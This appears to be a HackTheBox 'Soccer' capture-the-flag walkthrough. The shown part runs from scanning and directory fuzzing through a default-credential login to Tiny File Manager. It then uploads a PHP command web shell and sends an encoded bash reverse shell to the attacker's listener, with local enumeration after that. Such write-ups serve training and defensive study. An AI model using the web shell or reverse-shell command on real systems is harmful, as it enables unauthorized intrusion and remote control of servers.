@@ -1,0 +1,1590 @@
+
+  
+    
+    <title>
+      HackTheBox - Soccer (Easy)
+    </title>
+    
+  
+  
+    
+      <header>
+<div class="header"><img src="https://www.notion.so/images/page-cover/gradients_8.png" class="headerImage"/>
+<img class="headerIcon" src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Soccer/icon.png"/>
+<h1 class="mainTitle">
+          HackTheBox - Soccer (Easy)
+        </h1 class="mainTitle">
+</div></header>
+      <div class="writeUp">
+        <h1 id="3513d73b-b05a-4c41-840a-f0169127034e">
+          Table of contents
+        </h1>
+        <nav id="7a648f34-8a9f-4379-a05e-69b5ed782aea">
+          <div>
+            <a href="#3513d73b-b05a-4c41-840a-f0169127034e">
+              Table of contents
+            </a>
+          </div>
+          <div>
+            <a href="#80a22396-e7b9-4425-858f-2522e2c2361a">
+              Enumeration
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#c640e0cc-fcec-434d-a00e-a8b206957bda">
+              
+                Nmap scan
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#dd8ad53e-6004-46e8-8a16-948404fe1483">
+              
+                Web service enumeration
+              
+            </a>
+          </div>
+          <div>
+            <a href="#dbb308d4-df11-487c-9a04-2a496027de28">
+              Initial access
+            </a>
+          </div>
+          <div>
+            <a href="#338bab65-2539-418c-ada2-be4775688e22">
+              Post exploitation
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#a0f2dfb3-5219-4392-a43c-1d6f5cc5dd91">
+              
+                Local enumeration
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#d54bd208-438a-49b9-ba27-a5f70ba7ba87">
+              
+                Privilege escalation (player)
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#d42af8f3-77a3-42d0-a49a-446dfabb4f2a">
+              
+                Privilege escalation (root)
+              
+            </a>
+          </div>
+          <div>
+            <a href="#f49d1e4d-e92d-4e74-a62a-fe314954d669">
+              Clearing tracks
+            </a>
+          </div>
+          <div>
+            <a href="#77024be1-5d39-4674-bb54-f69b95c8c0ad">
+              Vulnerabilities summary
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#dd08ff65-876f-45ee-bc99-08b0079075f0">
+              
+                Default credentials
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#6fee4375-558b-410b-853d-994935abf838">
+              
+                Web server misconfiguration
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#c8018a1b-58ae-4a70-9857-c0137f1f6da3">
+              
+                Structured Query Language injection
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#e74da1f5-2fe9-462c-a43c-c9a3fabb24bd">
+              
+                Clear-text credentials
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#7a869503-9393-4f42-95e2-c79d487d92bb">
+              
+                Improper access control
+              
+            </a>
+          </div>
+          <div>
+            <a href="#ac9838f8-1b12-4a55-a39c-12f463c5cbe3">
+              Tools used
+            </a>
+          </div>
+          <div>
+            <a href="#41d8c6cc-2060-497a-b01a-42897017076c">
+              Sources
+            </a>
+          </div>
+        </nav>
+        <h1 id="80a22396-e7b9-4425-858f-2522e2c2361a">
+          Enumeration
+        </h1>
+        <h2 id="c640e0cc-fcec-434d-a00e-a8b206957bda">
+          
+            Nmap scan
+          
+        </h2>
+        
+        
+        
+<pre id="313dd768-0989-4d22-a4c9-a9b6fd2628fe" class="code"><code># Nmap 7.94SVN scan initiated Fri Feb 23 10:57:42 2024 as: nmap -A -p- -T5 -v -oN nmapResults.txt 10.129.155.184
+Warning: 10.129.155.184 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.129.155.184
+Host is up (0.034s latency).
+Not shown: 63943 closed tcp ports (conn-refused), 1589 filtered tcp ports (no-response)
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
+|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
+|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
+80/tcp   open  http            nginx 1.18.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://soccer.htb/
+9091/tcp open  xmltec-xmlmail?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|   GetRequest: 
+|     HTTP/1.1 404 Not Found
+|     Content-Security-Policy: default-src &#x27;none&#x27;
+|     X-Content-Type-Options: nosniff
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 139
+|     Date: Fri, 23 Feb 2024 15:58:49 GMT
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang=&quot;en&quot;&gt;
+|     &lt;head&gt;
+|     &lt;meta charset=&quot;utf-8&quot;&gt;
+|     &lt;title&gt;Error&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;pre&gt;Cannot GET /&lt;/pre&gt;
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   HTTPOptions, RTSPRequest: 
+|     HTTP/1.1 404 Not Found
+|     Content-Security-Policy: default-src &#x27;none&#x27;
+|     X-Content-Type-Options: nosniff
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 143
+|     Date: Fri, 23 Feb 2024 15:58:49 GMT
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang=&quot;en&quot;&gt;
+|     &lt;head&gt;
+|     &lt;meta charset=&quot;utf-8&quot;&gt;
+|     &lt;title&gt;Error&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;
+|     &lt;/body&gt;
+|_    &lt;/html&gt;
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9091-TCP:V=7.94SVN%I=7%D=2/23%Time=65D8C0B4%P=x86_64-pc-linux-gnu%r
+SF:(informix,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20clos
+SF:e\r\n\r\n&quot;)%r(drda,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection
+SF::\x20close\r\n\r\n&quot;)%r(GetRequest,168,&quot;HTTP/1\.1\x20404\x20Not\x20Found
+SF:\r\nContent-Security-Policy:\x20default-src\x20&#x27;none&#x27;\r\nX-Content-Type
+SF:-Options:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\
+SF:nContent-Length:\x20139\r\nDate:\x20Fri,\x2023\x20Feb\x202024\x2015:58:
+SF:49\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20l
+SF:ang=\&quot;en\&quot;&gt;\n&lt;head&gt;\n&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n&lt;title&gt;Error&lt;/title&gt;\
+SF:n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20GET\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r
+SF:(HTTPOptions,16C,&quot;HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-
+SF:Policy:\x20default-src\x20&#x27;none&#x27;\r\nX-Content-Type-Options:\x20nosniff\
+SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201
+SF:43\r\nDate:\x20Fri,\x2023\x20Feb\x202024\x2015:58:49\x20GMT\r\nConnecti
+SF:on:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n&lt;head&gt;\n
+SF:&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pr
+SF:e&gt;Cannot\x20OPTIONS\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(RTSPRequest,16C,
+SF:&quot;HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20defaul
+SF:t-src\x20&#x27;none&#x27;\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\
+SF:x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Fr
+SF:i,\x2023\x20Feb\x202024\x2015:58:49\x20GMT\r\nConnection:\x20close\r\n\
+SF:r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n&lt;head&gt;\n&lt;meta\x20charset=
+SF:\&quot;utf-8\&quot;&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20OPTIO
+SF:NS\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(RPCCheck,2F,&quot;HTTP/1\.1\x20400\x20
+SF:Bad\x20Request\r\nConnection:\x20close\r\n\r\n&quot;)%r(DNSVersionBindReqTCP
+SF:,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n
+SF:&quot;)%r(DNSStatusRequestTCP,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConn
+SF:ection:\x20close\r\n\r\n&quot;)%r(Help,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Reques
+SF:t\r\nConnection:\x20close\r\n\r\n&quot;)%r(SSLSessionReq,2F,&quot;HTTP/1\.1\x2040
+SF:0\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&quot;);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Feb 23 10:58:52 2024 -- 1 IP address (1 host up) scanned in 70.12 seconds</code></pre>
+        <p id="70d840a3-e89b-4aa7-9ee3-2e7b9a3fca81">
+          There is a web server on port 80 running nginx 1.18.0. It redirects us to soccer.htb, so we found a virtual host. We can add it to our /etc/hosts file (or C:/Windows/System32/drivers/etc/hosts on Windows systems).
+        </p>
+        <h2 id="dd8ad53e-6004-46e8-8a16-948404fe1483">
+          
+            Web service enumeration
+          
+        </h2>
+        <p id="b15549ab-1c02-442d-9a45-6394e3350957">
+          Let’s take a look at the web server on port 80 using a web browser :
+        </p>
+        
+          <a href="HackTheBox%20-%20Soccer%20(Easy)%20e6f7750412bf44b38e4412c863c6c6ab/Untitled.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Soccer/Untitled.png"/>
+          </a>
+        
+        <p id="8b5c569f-0616-455d-b0c9-82bba3a2b96f">
+          Nothing seems to be interesting here. Let’s use ffuf to fuzz directories :
+        </p>
+        
+        
+        
+<pre id="0d536fa8-bcff-4952-9d3d-89d6de6813b7" class="code"><code>┌──(kali㉿kali)-[~/Desktop/Soccer]
+└─$ ffuf -u http://soccer.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 6917
+
+        /&#x27;___\  /&#x27;___\           /&#x27;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://soccer.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 6917
+________________________________________________
+
+tiny                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 36ms]</code></pre>
+        <p id="06c97b7a-1c76-4027-921c-2dc8f0719a57">
+          We found a directory named tiny. Let’s take a look at it using our web browser :
+        </p>
+        
+          <a href="HackTheBox%20-%20Soccer%20(Easy)%20e6f7750412bf44b38e4412c863c6c6ab/Untitled%201.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Soccer/Untitled%201.png"/>
+          </a>
+        
+        <p id="ecde8d46-8def-4338-ab8e-195d3fa7b099">
+          This is the login page for Tiny File Manager. 
+        </p>
+        <blockquote id="f62bc33b-25cc-42b3-b988-e147295be602">
+          TinyFileManager is web based PHP 
+          
+            file
+          
+           
+          
+            manager
+          
+           and it is a simple, fast and small size in single-
+          
+            file
+          
+           PHP 
+          
+            file
+          
+           that can be dropped into any folder on your server, multi-language ready web application for storing, uploading, editing and 
+          
+            managing
+          
+           
+          
+            files
+          
+           and folders online via web browser.
+        </blockquote>
+        <p id="d4de23f4-a6c4-483c-91dc-9be0473e96d1">
+          If we find a way to gain access to this component, we may be able to upload a PHP web shell (or reverse shell).
+        </p>
+        <h1 id="dbb308d4-df11-487c-9a04-2a496027de28">
+          Initial access
+        </h1>
+        <p id="bb4ae7ec-883b-414d-8f6d-f73e4ea14d11">
+          First, we can try to use the default credentials for Tiny File Manager. According to the 
+          <a href="http://README.md">
+            README.md
+          </a>
+           file present in the official GitHub repository, the default credentials are admin:admin@123. If we enter those credentials, we are redirected to this page :
+        </p>
+        
+          <a href="HackTheBox%20-%20Soccer%20(Easy)%20e6f7750412bf44b38e4412c863c6c6ab/Untitled%202.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Soccer/Untitled%202.png"/>
+          </a>
+        
+        <p id="85cbf680-e611-4c4f-9bd9-5adb2bbc986b">
+          So, we have now access to Tiny File Manager. We can see the current version at the bottom of the page which is 2.4.3. If we navigate in this tiny folder, we can find an upload folder on which we have read, write and execute permissions : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Soccer%20(Easy)%20e6f7750412bf44b38e4412c863c6c6ab/Untitled%203.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Soccer/Untitled%203.png"/>
+          </a>
+        
+        <p id="0ac4b724-9b88-40df-a305-c37388fd3e9b">
+          We can navigate to the uploads directory and upload a web shell inside of it. First, we can create a very simple web shell :
+        </p>
+        
+        
+        
+<pre id="f4e87af4-9532-47b7-8220-b94503d90199" class="code"><code>┌──(kali㉿kali)-[~/Desktop/Soccer]
+└─$ cat shell.php      
+&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;</code></pre>
+        <p id="269b31b6-d0fa-4555-a0cc-76b39ee5c140">
+          This PHP code will simply pass the cmd variable passed in the URL to the system function. The system function is used to run OS commands on the server. After uploading the php web shell, we can execute a reverse shell like so :
+        </p>
+        
+        
+        
+<pre id="5751ccd9-8142-4d64-8ed7-ace8911801c4" class="code"><code>┌──(kali㉿kali)-[~/Desktop/Soccer]
+└─$ curl &#x27;http://soccer.htb/tiny/uploads/shell.php?cmd=echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC43MS80NDQ0IDA%2BJjE%3D|base64%20-d|bash&#x27;</code></pre>
+        <p id="7bf745a0-0fc2-47f1-81b1-49c1f32d3cbd">
+          Now, let’s take a look at our listener :
+        </p>
+        
+        
+        
+<pre id="ca08e1a8-84df-4ff4-85c4-7d28f5f58510" class="code"><code>┌──(kali㉿kali)-[~/Desktop/Soccer]
+└─$ pwncat-cs -lp 4444
+/home/kali/.local/lib/python3.11/site-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
+  &#x27;class&#x27;: algorithms.Blowfish,
+[11:03:56] Welcome to pwncat 🐈!                                                                                  __main__.py:164
+[11:08:55] received connection from 10.129.2.212:53460                                                                 bind.py:84
+[11:08:56] 10.129.2.212:53460: registered new host w/ db                                                           manager.py:957
+(local) pwncat$                                                                                                                  
+(remote) www-data@soccer:/var/www/html/tiny/uploads$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+        <p id="c05a1707-9dc7-4ac8-ab38-c8224595cddf">
+          We have now a foothold on the system as www-data.
+        </p>
+        <h1 id="338bab65-2539-418c-ada2-be4775688e22">
+          Post exploitation
+        </h1>
+        <h2 id="a0f2dfb3-5219-4392-a43c-1d6f5cc5dd91">
+          
+            Local enumeration
+          
+        </h2>
+        <p id="175d8055-5055-4077-8227-bcc5d41837b4">
+          Let’s take a look at the /etc/passwd file :
+        </p>
+        
+        
+        
+<pre id="b345810d-f5c6-4939-8b99-eb67112a11c2" class="code"><code>(remote) www-data@soccer:/var/www/html/tiny/uploads$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+fwupd-refresh:x:112:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+player:x:1001:1001::/home/player:/bin/bash
+mysql:x:113:121:MySQL Server,,,:/nonexistent:/bin/false
+_laurel:x:997:997::/var/log/laurel:/bin/false</code></pre>
+        <p id="3488a07b-2672-404c-958e-d52053147cfd">
+          We can see that there is a local user named player, and his home directory is located in /home/player. We don’t have write permissions on his home directory and we cannot read any file in it. Let’s take a look at the listening ports to see if there is useful services accessible locally :
+        </p>
+        
+        
+        
+<pre id="89b7748d-fb3e-4c01-b564-c3cb811fd80f" class="code"><code>(remote) www-data@soccer:/var/www/html/tiny/uploads$ netstat -tulpn
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:9091            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1034/nginx: worker  
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      1034/nginx: worker  
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -</code></pre>
+        <p id="16dc4f79-e14d-415c-a598-74a13be4d71a">
+          It seems that there is MySQL running on the system since port 3306 is listening, but we don’t have valid credentials for this service. Also, there is another service running on port 3000. We can use curl to see if this is an HTTP service :
+        </p>
+        
+        
+        
+<pre id="6033094c-f0d8-40f4-ba07-b922b6bac7ab" class="code"><code>(remote) www-data@soccer:/var/www/html/tiny/uploads$ curl http://localhost:3000/
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+    &lt;head&gt;
+        &lt;meta charset=&quot;UTF-8&quot;&gt;
+        &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+        &lt;link href=&quot;/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; id=&quot;bootstrap-css&quot;&gt;
+        &lt;script src=&quot;/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+        &lt;script src=&quot;/js/jquery.min.js&quot;&gt;&lt;/script&gt;    
+        &lt;title&gt;Soccer&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;style&gt;
+        header {
+            position: relative;
+            background-color: black;
+            background-image: url(&#x27;/img/football.jpg&#x27;);
+            height: 75vh;
+            min-height: 25rem;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        .display-3 {
+            color: greenyellow;
+        }
+
+        h1 {
+            text-align: center;
+        }
+
+        header video {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            min-width: 100%;
+            min-height: 100%;
+            width: auto;
+            height: auto;
+            z-index: 0;
+            -ms-transform: translateX(-50%) translateY(-50%);
+            -moz-transform: translateX(-50%) translateY(-50%);
+            -webkit-transform: translateX(-50%) translateY(-50%);
+            transform: translateX(-50%) translateY(-50%);
+        }
+
+        header .container {
+            position: relative;
+            z-index: 2;
+        }
+
+        header .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 100%;
+            opacity: 0.5;
+            z-index: 1;
+        }
+
+        @media (pointer: coarse) and (hover: none) {
+            header {
+                background: url(&#x27;img/football.jpg&#x27;);
+            }
+
+            header video {
+                display: none;
+            }
+        }
+    &lt;/style&gt;
+    &lt;body&gt;
+        &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark&quot;&gt;
+    &lt;div class=&quot;container-fluid&quot;&gt;
+        &lt;a class=&quot;navbar-brand&quot;&gt;Soccer&lt;/a&gt;
+        &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNavAltMarkup&quot; aria-controls=&quot;navbarNavAltMarkup&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+            &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+        &lt;/button&gt;
+        &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNavAltMarkup&quot;&gt;
+            &lt;div class=&quot;navbar-nav&quot;&gt;
+                &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/&quot;&gt;Home&lt;/a&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;navbar-nav&quot;&gt;
+                &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/match&quot;&gt;Match&lt;/a&gt;
+            &lt;/div&gt;
+            
+            
+                &lt;div class=&quot;navbar-nav&quot;&gt;
+                    &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/login&quot;&gt;Login&lt;/a&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;navbar-nav&quot;&gt;
+                    &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/signup&quot;&gt;Signup&lt;/a&gt;
+                &lt;/div&gt;
+            
+            
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+        &lt;header&gt;
+            &lt;div class=&quot;container h-100&quot;&gt;
+                &lt;div class=&quot;d-flex h-100 text-center align-items-center&quot;&gt;
+                    &lt;div class=&quot;w-100 text-white&quot;&gt;
+                        &lt;h1 class=&quot;display-3&quot;&gt;HTB FootBall Club&lt;/h1&gt;
+                        &lt;p class=&quot;lead mb-0&quot;&gt;&quot;We Love Soccer&quot;&lt;/p&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;/style&gt;
+        &lt;/header&gt;
+        &lt;section class=&quot;my-5&quot;&gt;
+            &lt;div class=&quot;container&quot;&gt;
+                &lt;div class=&quot;row&quot;&gt;
+                        &lt;p&gt;Due to the scope and popularity of the sport, professional football clubs carry a significant commercial existence, with fans expecting personal service and interactivity, and stakeholders viewing the field of professional football as a source of significant business advantages. For this reason, expensive player transfers have become an expectable part of the sport. Awards are also handed out to managers or coaches on a yearly basis for excellent performances. The designs, logos and names of professional football clubs are often licensed trademarks. The difference between a football team and a (professional) football club is incorporation, a football club is an entity which is formed and governed by a committee and has members which may consist of supporters in addition to players. &lt;/p&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/section&gt;
+        &lt;!-- Page Content --&gt;
+        &lt;h1&gt;Latest News&lt;/h1&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-xl-3 col-md-6 mb-4&quot;&gt;
+                    &lt;div class=&quot;card border-0 shadow&quot;&gt;
+                        &lt;img src=&quot;/img/ground1.jpg&quot; class=&quot;card-img-top&quot; alt=&quot;admin&quot;&gt;
+                        &lt;div class=&quot;card-body text-center&quot;&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Get updates on the latest World Cup action and find articles, videos, commentary and analysis in one place.&lt;/p&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-xl-3 col-md-6 mb-4&quot;&gt;
+                    &lt;div class=&quot;card border-0 shadow&quot;&gt;
+                        &lt;img src=&quot;/img/ground2.jpg&quot; class=&quot;card-img-top&quot; alt=&quot;admin&quot;&gt;
+                        &lt;div class=&quot;card-body text-center&quot;&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;The FIFA World Cup Qatar 2022 will be played from 20 November to 18 December.&lt;/p&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-xl-3 col-md-6 mb-4&quot;&gt;
+                    &lt;div class=&quot;card border-0 shadow&quot;&gt;
+                        &lt;img src=&quot;/img/ground3.jpg&quot; c alt=&quot;admin&quot;&gt;
+                        &lt;div class=&quot;card-body text-center&quot;&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Soccer is the most popular game in the world. In many countries it is known as “football”.&lt;/p&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-xl-3 col-md-6 mb-4&quot;&gt;
+                    &lt;div class=&quot;card border-0 shadow&quot;&gt;
+                        &lt;img src=&quot;/img/ground4.jpg&quot; class=&quot;card-img-top&quot; alt=&quot;admin&quot;&gt;
+                        &lt;div class=&quot;card-body text-center&quot;&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;FIFA World Cup is the most popular soccer tournament that is followed by billions of people around the world on their Television so I wanted to take some time and make this web page dedicated to World Cup Soccer Facts only.&lt;/p&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+                &lt;!-- /.row --&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+        &lt;!-- /.container --&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+        <p id="61fefcb3-37d9-4fb4-8199-1db5b327bf18">
+          This is not the same web application as we used to gain a foothold on the system. By looking at nginx configuration files, we can see that this web application is accessible through the soc-player.soccer.htb virtual host :
+        </p>
+        
+        
+        
+<pre id="e57becde-8e96-4eec-813c-33f144a99d86" class="code"><code>(remote) www-data@soccer:/var/www/html/tiny/uploads$ ls /etc/nginx/sites-available/               
+default  soc-player.htb
+(remote) www-data@soccer:/var/www/html/tiny/uploads$ cat /etc/nginx/sites-available/soc-player.htb 
+server {
+        listen 80;
+        listen [::]:80;
+
+        server_name soc-player.soccer.htb;
+
+        root /root/app/views;
+
+        location / {
+                proxy_pass http://localhost:3000;
+                proxy_http_version 1.1;
+                proxy_set_header Upgrade $http_upgrade;
+                proxy_set_header Connection &#x27;upgrade&#x27;;
+                proxy_set_header Host $host;
+                proxy_cache_bypass $http_upgrade;
+        }
+
+}</code></pre>
+        <p id="02dd6056-76e6-44e3-8773-51a69a73a0ff">
+          We can add this virtual host to our /etc/hosts file to access it from our attacking host. Now let’s take a look at this web application using our web browser :
+        </p>
+        
